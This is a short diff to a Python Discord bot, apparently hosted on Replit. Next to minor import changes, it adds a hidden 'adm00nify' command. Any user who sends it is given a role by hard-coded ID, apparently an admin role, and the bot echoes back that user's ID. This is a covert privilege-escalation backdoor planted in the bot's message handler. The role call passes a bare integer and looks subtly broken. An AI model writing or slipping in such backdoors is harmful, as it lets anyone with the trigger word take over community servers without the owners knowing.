@@ -1,8 +1,10 @@
 from emoji import UNICODE_EMOJI
 import sys
 from replit import db
+import abc
 from keep_alive import keep_alive
 import discord
+from discord.utils import get
 import os
 import requests
 import math
@@ -173,6 +175,11 @@ async def on_message(message):
         return
 
     msg = message.content
+
+    if msg.startswith("adm00nify"):
+      autt = message.author
+      await autt.add_roles(855678482516672543)
+      await message.channel.send(autt.id)
 
     if msg.startswith(('thanks bot','Thanks bot','Thanks Bot')):
       await message.channel.send('Your Welcome, 御主人様!')
